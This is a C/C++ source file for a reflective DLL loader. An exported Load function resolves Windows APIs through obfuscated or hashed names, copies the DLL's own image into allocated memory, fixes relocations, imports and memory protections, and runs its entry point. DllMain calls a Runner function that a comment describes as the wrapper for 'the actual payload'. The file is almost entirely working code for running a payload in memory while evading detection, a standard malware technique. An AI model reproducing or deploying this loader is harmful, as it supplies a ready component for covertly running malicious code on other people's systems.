#include "main.h"



HINSTANCE   hAppInstance = NULL;

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{

    switch (ul_reason_for_call)
    {
    case DLL_QUERY_HMODULE:
        if (lpReserved != NULL)
            *(HMODULE*)lpReserved = hAppInstance;
        break;

    case DLL_PROCESS_ATTACH:

        hAppInstance = hModule;
        
        // Wrapper function for the actual payload
        Runner();

        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}



/*-----------------------------------------
   Exported function that is responsible 
   for reflective loading of the DLL
-----------------------------------------*/
extern "C" __declspec(dllexport) ULONG_PTR Load(LPVOID lpParameter) {

    // Get the base of the DLL
    ULONG_PTR dllBaseAddress = (ULONG_PTR)KaynCaller();

    // Resolve the required APIs
    HMODULE hModule = GetHand(K32);
    if (!hModule) {
        return NULL;
    }

    HMODULE hNTModule = GetHand(NTLIB);
    if (!hNTModule) {
        return NULL;
    }

    WINAPIS WinAPIs = { 0 };
    PEHDRS PEHdrs = { 0 };

    WinAPIs.fnAlloc = (Alloc_t)GetAddr(hNTModule, NTVA, &WinAPIs);
    WinAPIs.fnLoad = (Load_t)GetAddr(hNTModule, LLB, &WinAPIs);
    WinAPIs.fnProt = (Protect_t)GetAddr(hNTModule, NTVP, &WinAPIs);
    WinAPIs.Flusher = (Flush_t)GetAddr(hNTModule, FLS, &WinAPIs);


    if (WinAPIs.fnAlloc == NULL || WinAPIs.fnLoad == NULL || WinAPIs.fnProt == NULL) {
        return NULL;
    }


    // Parse the PE headers and store them for later usage
    if (!ParsePEHeaders(&PEHdrs, (LPVOID)dllBaseAddress)) {
        return NULL;
    }

    // Allocate memory and copy all sections and headers
    LPVOID pPEBase = PreparePEMemory(&PEHdrs, &WinAPIs);
    if (pPEBase == NULL) {
        return NULL;
    }

    // Apply relocations
    ApplyRelocations(&PEHdrs, pPEBase);

    // Fix the import table
    if (!FixIAT(&PEHdrs, pPEBase, &WinAPIs)) {
        return NULL;
    }

    // FIx the sections's memory protections
    if (!FixMemProtections(&PEHdrs, pPEBase, &WinAPIs)) {
        return NULL;
    }

    // Flush the instruction cache
    WinAPIs.Flusher((HANDLE)-1, NULL, 0);

    // Call the DLL entrypoint
    LPVOID pEntry = (PBYTE)pPEBase + PEHdrs.pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    DllEntry entry = (DllEntry)pEntry;

    PVOID params = NULL;
    entry(pPEBase, DLL_PROCESS_ATTACH, params);

    return (ULONG_PTR)entry;
}